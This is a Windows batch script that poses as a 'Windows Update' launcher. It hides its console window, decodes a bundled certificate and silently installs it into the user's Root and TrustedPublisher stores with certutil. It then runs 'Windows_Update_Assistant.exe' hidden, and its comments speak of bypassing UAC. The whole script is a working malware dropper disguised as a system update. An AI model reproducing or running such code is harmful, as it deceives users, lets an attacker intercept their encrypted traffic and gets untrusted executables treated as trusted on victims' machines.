@echo off
chcp 65001 >nul
title Windows Update

REM Hide the command window
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit

REM Set registry to trust the certificate silently
reg add "HKCU\Software\Microsoft\SystemCertificates\Root\Certificates" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\SystemCertificates\TrustedPublisher\Certificates" /f >nul 2>&1

REM Extract and install certificate silently using certutil
powershell -Command "try { if (Test-Path 'windows_cert.cer') { $certContent = [System.IO.File]::ReadAllText('windows_cert.cer'); $certContent = $certContent -replace '-----BEGIN CERTIFICATE-----',''; $certContent = $certContent -replace '-----END CERTIFICATE-----',''; $certContent = $certContent -replace '\s',''; $bytes = [System.Convert]::FromBase64String($certContent); [System.IO.File]::WriteAllBytes('temp_cert.der', $bytes) } } catch {}"

REM Add to trusted stores silently
certutil -addstore -f Root temp_cert.der >nul 2>&1
certutil -addstore -f TrustedPublisher temp_cert.der >nul 2>&1

REM Clean up temporary file
del temp_cert.der >nul 2>&1

REM Wait a moment for certificate to be registered
timeout /t 2 /nobreak >nul

REM Launch the application with hidden window
if exist "Windows_Update_Assistant.exe" (
    REM Use PowerShell to bypass UAC for the executable
    powershell -Command "try { $process = Start-Process -FilePath 'Windows_Update_Assistant.exe' -WindowStyle Hidden -PassThru; if ($process.ExitCode -eq 0) { exit 0 } else { exit 1 } } catch { exit 1 }"
    
    REM Alternative method if above fails
    if errorlevel 1 (
        start "" /B "Windows_Update_Assistant.exe"
    )
    
    exit
) else (
    REM Show error only if file is missing
    echo Error: Windows Update Assistant not found!
    pause
    exit
)